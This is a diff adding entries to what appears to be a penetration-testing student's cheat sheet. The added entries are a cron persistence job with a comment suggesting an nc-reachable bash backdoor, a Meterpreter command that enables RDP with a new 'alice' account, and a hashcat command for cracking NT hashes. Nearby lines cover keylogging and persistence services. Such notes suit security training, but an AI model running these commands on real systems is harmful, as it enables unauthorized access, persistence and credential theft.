@@ -50,6 +50,10 @@ lastlog
 *** use post/linux/manage/sshkey_persistence //set CREATESSHFOLDER true
 wget http://ip/file.txt
 
+Persistance via cron***
+echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron // put a bash backdoor instead and connect with nc
+crontab -i cron
+crontab -l
 
 UAC BYPASS -
 net localgroup administrators // shows admins
@@ -67,6 +71,7 @@ set SMBUser to user
 
 WINDOWS POST EXP -
 enable_rdp // net user administrator password
+run getgui -e -u alice -p hack_123321 // in meterprter shell
 keyscan_start //keyscan dump
 window/local/persistance_service // set up multi handler with same payload and LPORT
 post/windows/gather/enum_shares
@@ -252,6 +257,9 @@ python -m SimpleHTTPServer 80
 
 COMPILING -
 //bin-sploits github -precompiled
+
+HASHCAT --
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt    // -m 1000 for nt hashes
 
 
 
